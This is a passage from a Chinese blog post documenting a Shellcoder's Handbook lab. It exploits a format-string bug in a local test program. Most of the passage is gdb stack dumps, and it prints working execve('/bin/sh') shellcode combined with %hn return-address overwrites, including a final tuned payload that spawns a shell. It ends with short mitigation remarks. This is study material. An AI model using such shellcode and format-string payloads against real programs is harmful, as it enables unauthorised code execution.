0x00000000</span><br><span class="line">0xbffff110:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff120:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff130:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff140:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff150:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff160:	0x00000002	0xbffff224	0xbffff230	0xbffff190</span><br><span class="line">(gdb) </span><br><span class="line">0xbffff170:	0x00000000	0xb7fb5000	0x00000000	0xb7e1b637</span><br><span class="line">0xbffff180:	0xb7fb5000	0xb7fb5000	0x00000000	0xb7e1b637</span><br><span class="line">0xbffff190:	0x00000002	0xbffff224	0xbffff230	0x00000000</span><br><span class="line">0xbffff1a0:	0x00000000	0x00000000	0xb7fb5000	0xb7fffc04</span><br><span class="line">0xbffff1b0:	0xb7fff000	0x00000000	0xb7fb5000	0xb7fb5000</span><br><span class="line">0xbffff1c0:	0x00000000	0xab847af5	0x970cb4e5	0x00000000</span><br><span class="line">0xbffff1d0:	0x00000000	0x00000000	0x00000002	0x08048340</span><br><span class="line">0xbffff1e0:	0x00000000	0xb7feff10	0xb7fea780	0xb7fff000</span><br><span class="line">0xbffff1f0:	0x00000002	0x08048340	0x00000000	0x08048361</span><br><span class="line">0xbffff200:	0x0804843b	0x00000002	0xbffff224	0x080484b0</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure></li>
<li><p>上述仅仅是从第一步开始的时候这样探测，因此如果我们大概知道了这个”套路”就应该上真家伙。注意观察run后面的参数。解释一下这个exp(exploit)。前面部分直到\x80均为shellcode,取自谷大神的。后续填充了三个\x90,在Intel里面为<code>nop</code>。不过在这里不会执行到，只要不为\0即可。接着的8个字节为ret的高16位和低16位，我们可以看到0xbffff0bc开始的8个字节<code>大致</code>为ret的地址。这不是随机的，这是经过精心构造的，由于地址不对，我将重新修正(0xbffff014C)。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">(gdb) run $<span class="string">&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x90\x90\x90\x3e\xf2\xff\xbf\x3c\xf2\xff\xbf%49119x%10$hn%12689x%11$hn&#x27;</span></span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">Starting program: /home/pgp/hacker/shellcodershandbook/code/ch04/fmt $<span class="string">&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x90\x90\x90\x3e\xf2\xff\xbf\x3c\xf2\xff\xbf%49119x%10$hn%12689x%11$hn&#x27;</span></span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0804847f <span class="keyword">in</span> main (argc=2, argv=0xbffff1e4) at fmt.c:12</span><br><span class="line">12		strcpy(evil, argv[1]);</span><br><span class="line">(gdb) x/40x <span class="variable">$esp</span></span><br><span class="line">0xbffff090:	0xbffff0a0	0xbffff3a1	0xb7fd7b48	0x00000001</span><br><span class="line">0xbffff0a0:	0xe1f7c931	0x68510bb0	0x68732f2f	0x69622f68</span><br><span class="line">0xbffff0b0:	0xcde3896e	0x90909080	0xbffff23e	0xbffff23c</span><br><span class="line">0xbffff0c0:	0x31393425	0x25783931	0x68243031	0x3231256e</span><br><span class="line">0xbffff0d0:	0x78393836	0x24313125	0x00006e68	0x00000000</span><br><span class="line">0xbffff0e0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff0f0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff100:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff110:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff120:	0x00000002	0xbffff1e4	0xbffff1f0	0xbffff150</span><br><span class="line">(gdb) </span><br><span class="line">0xbffff130:	0x00000000	0xb7fb5000	0x00000000	0xb7e1b637</span><br><span class="line">0xbffff140:	0xb7fb5000	0xb7fb5000	0x00000000	0xb7e1b637</span><br><span class="line">0xbffff150:	0x00000002	0xbffff1e4	0xbffff1f0	0x00000000</span><br><span class="line">0xbffff160:	0x00000000	0x00000000	0xb7fb5000	0xb7fffc04</span><br><span class="line">0xbffff170:	0xb7fff000	0x00000000	0xb7fb5000	0xb7fb5000</span><br><span class="line">0xbffff180:	0x00000000	0xe29ac6ee	0xde1388fe	0x00000000</span><br><span class="line">0xbffff190:	0x00000000	0x00000000	0x00000002	0x08048340</span><br><span class="line">0xbffff1a0:	0x00000000	0xb7feff10	0xb7fea780	0xb7fff000</span><br><span class="line">0xbffff1b0:	0x00000002	0x08048340	0x00000000	0x08048361</span><br><span class="line">0xbffff1c0:	0x0804843b	0x00000002	0xbffff1e4	0x080484b0</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure></li>
<li><p>这一次对了，仅仅修改两个字节即可。好了，现在我们需要修改的地址已经传递进来了，是时候将数据传进来的。此时可以看到我们要传递的数据应该为0xbfffff0a0,只要将此值覆盖ret，控制流程就会被劫持到这里执行shellcode，又由于栈空间是可以被执行的(编译选项,还可以利用指令<code>cat /proc/[pid]/maps</code>来看)。利用%hn的特性，我们仅仅需要写两次即可，而根据%hn的特性我们无奈地只能先写0xbfff再铺垫0xf0a0-0xbfff个字符继续写。当然在写0xbfff之前需要计算字符个数来填充，因此才有了后面的%49119x以及%12689x。根据这几个原理我们将继续修正这几个值来使得exp能够被触发。我们先来看printf执行之后的情况吧。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(gdb) run $<span class="string">&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x90\x90\x90\x4e\xf2\xff\xbf\x4c\xf2\xff\xbf%49119x%10$hn%12689x%11$hn&#x27;</span></span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">Starting program: /home/pgp/hacker/shellcodershandbook/code/ch04/fmt $<span class="string">&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x90\x90\x90\x4e\xf2\xff\xbf\x4c\xf2\xff\xbf%49119x%10$hn%12689x%11$hn&#x27;</span></span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0804847f <span class="keyword">in</span> main (argc=2, argv=0xbffff1e4) at fmt.c:12</span><br><span class="line">12		strcpy(evil, argv[1]);</span><br><span class="line">(gdb) x/40x <span class="variable">$esp</span></span><br><span class="line">0xbffff090:	0xbffff0a0	0xbffff3a1	0xb7fd7b48	0x00000001</span><br><span class="line">0xbffff0a0:	0xe1f7c931	0x68510bb0	0x68732f2f	0x69622f68</span><br><span class="line">0xbffff0b0:	0xcde3896e	0x90909080	0xbffff24e	0xbffff24c</span><br><span class="line">0xbffff0c0:	0x31393425	0x25783931	0x68243031	0x3231256e</span><br><span class="line">0xbffff0d0:	0x78393836	0x24313125	0x00006e68	0x00000000</span><br><span class="line">0xbffff0e0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff0f0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff100:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff110:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff120:	0x00000002	0xbffff1e4	0xbffff1f0	0xbffff150</span><br><span class="line">(gdb) </span><br><span class="line">0xbffff130:	0x00000000	0xb7fb5000	0x00000000	0xb7e1b637</span><br><span class="line">0xbffff140:	0xb7fb5000	0xb7fb5000	0x00000000	0xb7e1b637</span><br><span class="line">0xbffff150:	0x00000002	0xbffff1e4	0xbffff1f0	0x00000000</span><br><span class="line">0xbffff160:	0x00000000	0x00000000	0xb7fb5000	0xb7fffc04</span><br><span class="line">0xbffff170:	0xb7fff000	0x00000000	0xb7fb5000	0xb7fb5000</span><br><span class="line">0xbffff180:	0x00000000	0x09129cd8	0x359bd2c8	0x00000000</span><br><span class="line">0xbffff190:	0x00000000	0x00000000	0x00000002	0x08048340</span><br><span class="line">0xbffff1a0:	0x00000000	0xb7feff10	0xb7fea780	0xb7fff000</span><br><span class="line">0xbffff1b0:	0x00000002	0x08048340	0x00000000	0x08048361</span><br><span class="line">0xbffff1c0:	0x0804843b	0x00000002	0xbffff1e4	0x080484b0</span><br><span class="line">(gdb) </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>键入c之后程序继续运行，断在了printf刚刚执行完毕的地方。我们观察ret处发现并没有被修改，因此重新计算，再次重新运行。(发现前面也计算错了，得将f2改为f1).</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 2, 0x08048493 <span class="keyword">in</span> main (argc=2, argv=0xbffff1e4) at fmt.c:13</span><br><span class="line">13		<span class="built_in">printf</span>( argv[1]);</span><br><span class="line">(gdb) x/40x <span class="variable">$esp</span></span><br><span class="line">0xbffff090:	0xbffff3a1	0xbffff3a1	0xb7fd7b48	0x00000001</span><br><span class="line">0xbffff0a0:	0xe1f7c931	0x68510bb0	0x68732f2f	0x69622f68</span><br><span class="line">0xbffff0b0:	0xcde3896e	0x90909080	0xbffff24e	0xbffff24c</span><br><span class="line">0xbffff0c0:	0x31393425	0x25783931	0x68243031	0x3231256e</span><br><span class="line">0xbffff0d0:	0x78393836	0x24313125	0x00006e68	0x00000000</span><br><span class="line">0xbffff0e0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff0f0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff100:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff110:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff120:	0x00000002	0xbffff1e4	0xbffff1f0	0xbffff150</span><br><span class="line">(gdb) </span><br><span class="line">0xbffff130:	0x00000000	0xb7fb5000	0x00000000	0xb7e1b637</span><br><span class="line">0xbffff140:	0xb7fb5000	0xb7fb5000	0x00000000	0xb7e1b637</span><br><span class="line">0xbffff150:	0x00000002	0xbffff1e4	0xbffff1f0	0x00000000</span><br><span class="line">0xbffff160:	0x00000000	0x00000000	0xb7fb5000	0xb7fffc04</span><br><span class="line">0xbffff170:	0xb7fff000	0x00000000	0xb7fb5000	0xb7fb5000</span><br><span class="line">0xbffff180:	0x00000000	0x09129cd8	0x359bd2c8	0x00000000</span><br><span class="line">0xbffff190:	0x00000000	0x00000000	0x00000002	0x08048340</span><br><span class="line">0xbffff1a0:	0x00000000	0xb7feff10	0xb7fea780	0xb7fff000</span><br><span class="line">0xbffff1b0:	0x00000002	0x08048340	0x00000000	0x08048361</span><br><span class="line">0xbffff1c0:	0x0804843b	0x00000002	0xbffff1e4	0x080484b0</span><br><span class="line">(gdb) </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>如果最终的画面和这个差不多，那说明快要成功了。(注意下面的指令是我经过修正执行过后的，我仅仅是按上方向键来显示而已，并非又重新执行)可以清楚的看到ret值被修改成了shellcode的首地址。上面的exp中的%10$hn和%11$hn是从printf调用处开始数，第10个四字节和第11个四字节这两个地址printf将会以16位的方式写入之前输出的字符个数。(可以数数看)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 2, 0x08048493 <span class="keyword">in</span> main (argc=2, argv=0xbffff1e4) at fmt.c:13</span><br><span class="line">13		<span class="built_in">printf</span>( argv[1]);</span><br><span class="line">(gdb) x/40x <span class="variable">$esp</span></span><br><span class="line">0xbffff090:	0xbffff3a1	0xbffff3a1	0xb7fd7b48	0x00000001</span><br><span class="line">0xbffff0a0:	0xe1f7c931	0x68510bb0	0x68732f2f	0x69622f68</span><br><span class="line">0xbffff0b0:	0xcde3896e	0x90909080	0xbffff14e	0xbffff14c</span><br><span class="line">0xbffff0c0:	0x31393425	0x25783931	0x68243031	0x3231256e</span><br><span class="line">0xbffff0d0:	0x78393434	0x24313125	0x00006e68	0x00000000</span><br><span class="line">0xbffff0e0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff0f0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff100:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff110:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbffff120:	0x00000002	0xbffff1e4	0xbffff1f0	0xbffff150</span><br><span class="line">(gdb) </span><br><span class="line">0xbffff130:	0x00000000	0xb7fb5000	0x00000000	0xb7e1b637</span><br><span class="line">0xbffff140:	0xb7fb5000	0xb7fb5000	0x00000000	0xbffff0a0</span><br><span class="line">0xbffff150:	0x00000002	0xbffff1e4	0xbffff1f0	0x00000000</span><br><span class="line">0xbffff160:	0x00000000	0x00000000	0xb7fb5000	0xb7fffc04</span><br><span class="line">0xbffff170:	0xb7fff000	0x00000000	0xb7fb5000	0xb7fb5000</span><br><span class="line">0xbffff180:	0x00000000	0x7704a549	0x4b8deb59	0x00000000</span><br><span class="line">0xbffff190:	0x00000000	0x00000000	0x00000002	0x08048340</span><br><span class="line">0xbffff1a0:	0x00000000	0xb7feff10	0xb7fea780	0xb7fff000</span><br><span class="line">0xbffff1b0:	0x00000002	0x08048340	0x00000000	0x08048361</span><br><span class="line">0xbffff1c0:	0x0804843b	0x00000002	0xbffff1e4	0x080484b0</span><br><span class="line">(gdb) run $<span class="string">&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x90\x90\x90\x4e\xf1\xff\xbf\x4c\xf1\xff\xbf%49119x%10$hn%12449x%11$hn&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>键入c继续运行查看栈空间.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 3, 0x080484a5 <span class="keyword">in</span> main (argc=2, argv=0xbffff1e4) at fmt.c:15</span><br><span class="line">15	&#125;</span><br><span class="line">(gdb) x/40x <span class="variable">$esp</span></span><br><span class="line">0xbffff14c:	0xbffff0a0	0x00000002	0xbffff1e4	0xbffff1f0</span><br><span class="line">0xbffff15c:	0x00000000	0x00000000	0x00000000	0xb7fb5000</span><br><span class="line">0xbffff16c:	0xb7fffc04	0xb7fff000	0x00000000	0xb7fb5000</span><br><span class="line">0xbffff17c:	0xb7fb5000	0x00000000	0x7704a549	0x4b8deb59</span><br><span class="line">0xbffff18c:	0x00000000	0x00000000	0x00000000	0x00000002</span><br><span class="line">0xbffff19c:	0x08048340	0x00000000	0xb7feff10	0xb7fea780</span><br><span class="line">0xbffff1ac:	0xb7fff000	0x00000002	0x08048340	0x00000000</span><br><span class="line">0xbffff1bc:	0x08048361	0x0804843b	0x00000002	0xbffff1e4</span><br><span class="line">0xbffff1cc:	0x080484b0	0x08048510	0xb7fea780	0xbffff1dc</span><br><span class="line">0xbffff1dc:	0xb7fff918	0x00000002	0xbffff36e	0xbffff3a1</span><br><span class="line">(gdb) </span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>单步走,看指令可以执行确实运行在shellcode空间内了。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(gdb) si</span><br><span class="line">0xbffff0a0 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb) x/20i <span class="variable">$eip</span></span><br><span class="line">=&gt; 0xbffff0a0:	xor    %ecx,%ecx</span><br><span class="line">   0xbffff0a2:	mul    %ecx</span><br><span class="line">   0xbffff0a4:	mov    <span class="variable">$0xb</span>,%al</span><br><span class="line">   0xbffff0a6:	push   %ecx</span><br><span class="line">   0xbffff0a7:	push   <span class="variable">$0x68732f2f</span></span><br><span class="line">   0xbffff0ac:	push   <span class="variable">$0x6e69622f</span></span><br><span class="line">   0xbffff0b1:	mov    %esp,%ebx</span><br><span class="line">   0xbffff0b3:	int    <span class="variable">$0x80</span></span><br><span class="line">   0xbffff0b5:	nop</span><br><span class="line">   0xbffff0b6:	nop</span><br><span class="line">   0xbffff0b7:	nop</span><br><span class="line">   0xbffff0b8:	dec    %esi</span><br><span class="line">   0xbffff0b9:	icebp  </span><br><span class="line">   0xbffff0ba:	(bad)  </span><br><span class="line">   0xbffff0bb:	mov    <span class="variable">$0xbffff14c</span>,%edi</span><br><span class="line">   0xbffff0c0:	and    <span class="variable">$0x31313934</span>,%eax</span><br><span class="line">   0xbffff0c5:	cmp    %edi,0x25(%eax)</span><br><span class="line">   0xbffff0c8:	xor    %esi,(%eax)</span><br><span class="line">   0xbffff0ca:	and    <span class="variable">$0x68</span>,%al</span><br><span class="line">   0xbffff0cc:	outsb  %ds:(%esi),(%dx)</span><br><span class="line">(gdb) </span><br></pre></td></tr></table></figure>

<ul>
<li>再次键入c由于没有断点了会火力全开。Got it!可以看到新的shell已经成功运行。并且回弹了。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">process 30736 is executing new program: /bin/bash</span><br><span class="line">To run a <span class="built_in">command</span> as administrator (user <span class="string">&quot;root&quot;</span>), use <span class="string">&quot;sudo &lt;command&gt;&quot;</span>.</span><br><span class="line">See <span class="string">&quot;man sudo_root&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line"></span><br><span class="line">pgp@Rutk1t0r:ch04$ ps</span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line">28187 pts/13   00:00:00 bash</span><br><span class="line">30013 pts/13   00:00:01 gdb</span><br><span class="line">30736 pts/13   00:00:00 sh</span><br><span class="line">30988 pts/13   00:00:00 ps</span><br><span class="line">pgp@Rutk1t0r:ch04$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="直接运行呢"><a href="#直接运行呢" class="headerlink" title="直接运行呢?"></a>直接运行呢?</h1><ul>
<li>如果按照上述情况我们直接./fmt $(exp)即可获取shell。但是发现并不能，我还怀疑过是否是权限问题，用root之后发现栈指针又不一样又继续调整，gdb是可以但是直接运行还是不可以。因此才有了换成/bin/nc的shellcode的想法(因为怀疑回弹的shell和当前shell重复，但是输入exit后当前shell都退出了，说明没有子shell)。然后必然猜测shell直接执行可执行程序和用gdb调试可执行程序的esp必然不一样，导致exp注入失败。然后就想着用书上的知识去读栈空间的某些特定值，来修正偏移。首先我们观察栈空间中某些值是否和栈的值大致匹配，有可能是局部变量压入。我们可以先直接读出argc，根据上面测试的例程可以知道其偏移为48。为了esp不继续变化我将前面字符进行填充。观察到偏移量为39的地方貌似有一个跟具体栈空间相关的值，读出来，然后进行偏移修正。根据在调试的时候39偏移处的值与ret地址的差，然后在实际运行的时候读出来的值应该也是这个差值，因此来修正我们的exp。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pgp@Rutk1t0r:ch04$ ./fmt $<span class="string">&#x27;%48$x\n&#x27;</span></span><br><span class="line">2</span><br><span class="line">pgp@Rutk1t0r:ch04$ ./fmt  $<span class="string">&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x90\x90\x90\xce\xfa\xff\xbf\xcc\xfa\xff\xbfAAAAAAAAAAAAAAAAAAAA%48$x\n&#x27;</span></span><br><span class="line">1����</span><br><span class="line">     Qh//shh/bin��̀�����������AAAAAAAAAAAAAAAAAAAA2</span><br><span class="line">pgp@Rutk1t0r:ch04$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pgp@Rutk1t0r:ch04$ ./fmt  $<span class="string">&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x90\x90\x90\xce\xfa\xff\xbf\xcc\xfa\xff\xbfAAAAAAAAAAAAAAAAAAAA%39$x\n&#x27;</span></span><br><span class="line">1����</span><br><span class="line">     Qh//shh/bin��̀�����������AAAAAAAAAAAAAAAAAAAAbffff1a0</span><br><span class="line">pgp@Rutk1t0r:ch04$ </span><br></pre></td></tr></table></figure>




<ul>
<li>最终的exp为<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="string">&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x90\x90\x90\x9e\xf1\xff\xbf\x9c\xf1\xff\xbf%49119x%10$hn%12529x%11$hn&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li>这是我用ssh登录时候的场景，如果直接在本地运行估计又不一样，因此还需要随机应变。<br><img src="/images/The_Shellcodes_Handbook_ch04_successful.png" alt="The_Shellcodes_Handbook_ch04_successful.png"></li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>完成本次实验感觉是很艰难的，不同于简单的栈溢出漏洞，直接用字符覆盖高地址处的ret(函数的返回指针)即可控制eip。而printf类的格式化字符串漏洞需要精心构造地址值并反复修正。若想修复的话可以下载glibc源码将%$n等特性去掉重新编译后安装。这样可以加大利用难度，因此很多地方都建议不用printf类函数。各类语言也将类似功能的函数进行高度封装来提高安全性。本地实验的测试exp在<a target="_blank" rel="noopener" href="https://github.com/embpgp/the_shellcoders_handbook/blob/master/code/ch04/test.txt">这里</a>。</p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/embpgp.github.io/tags/C-C/" rel="tag"># C/C++</a>
              <a href="/embpgp.github.io/tags/exploit/" rel="tag"># exploit</a>
              <a href="/embpgp.github.io/tags/shellcode/" rel="tag"># shellcode</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/embpgp.github.io/2016/12/30/Linux%E5%86%85%E6%A0%B80-11%E5%AE%8C%E5%85%A8%E6%B3%A8%E9%87%8A-0-11%E7%9A%84loader-execve/" rel="prev" title="Linux内核0.11完全注释 0.11的loader->execve">
      <i class="fa fa-chevron-left"></i> Linux内核0.11完全注释 0.11的loader->execve
    </a></div>
      <div class="post-nav-item">
    <a href="/embpgp.github.io/2017/01/12/r00tk1t-init/" rel="next" title="r00tk1t init">
      r00tk1t init <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%8D%E8%AF%B4%E8%AF%B4fmt"><span class="nav-number">1.</span> <span class="nav-text">再说说fmt</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9D%A5%E4%B8%AA%E5%B0%8F%E5%AE%9E%E9%AA%8C"><span class="nav-number">2.</span> <span class="nav-text">来个小实验</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B9%B3%E5%8F%B0"><span class="nav-number">2.1.</span> <span class="nav-text">平台</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E4%BE%8B%E7%A8%8B"><span class="nav-number">2.2.</span> <span class="nav-text">测试例程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%81%9A%E6%88%90%E8%BF%99%E4%B8%AA%E6%B5%8B%E8%AF%95"><span class="nav-number">3.</span> <span class="nav-text">如何做成这个测试?</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E7%A8%8B%E5%BA%8F%E4%B8%BA%E4%BD%95%E8%A6%81%E6%94%B9"><span class="nav-number">3.1.</span> <span class="nav-text">测试程序为何要改?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" 